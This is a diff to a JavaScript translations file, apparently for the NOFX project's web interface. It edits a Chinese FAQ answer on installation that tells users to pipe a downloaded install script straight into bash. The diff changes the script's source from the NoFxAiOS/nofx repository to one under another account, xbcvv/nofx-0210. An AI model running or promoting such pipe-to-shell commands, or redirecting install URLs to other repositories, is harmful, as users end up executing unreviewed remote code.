@@ -2086,7 +2086,7 @@ export const translations = {
     // ===== 安装部署 =====
     faqHowToInstall: '如何安装 NOFX？',
     faqHowToInstallAnswer:
-      '最简单的方法（Linux/macOS）：运行 "curl -fsSL https://raw.githubusercontent.com/NoFxAiOS/nofx/main/install.sh | bash" - 这会自动安装 Docker 容器。然后在浏览器中打开 http://127.0.0.1:3000。手动安装或开发请克隆仓库并按照 README 说明操作。',
+      '最简单的方法（Linux/macOS）：运行 "curl -fsSL https://raw.githubusercontent.com/xbcvv/nofx-0210/main/install.sh | bash" - 这会自动安装 Docker 容器。然后在浏览器中打开 http://127.0.0.1:3000。手动安装或开发请克隆仓库并按照 README 说明操作。',
 
     faqWindowsInstallation: 'Windows 如何安装？',
     faqWindowsInstallationAnswer:
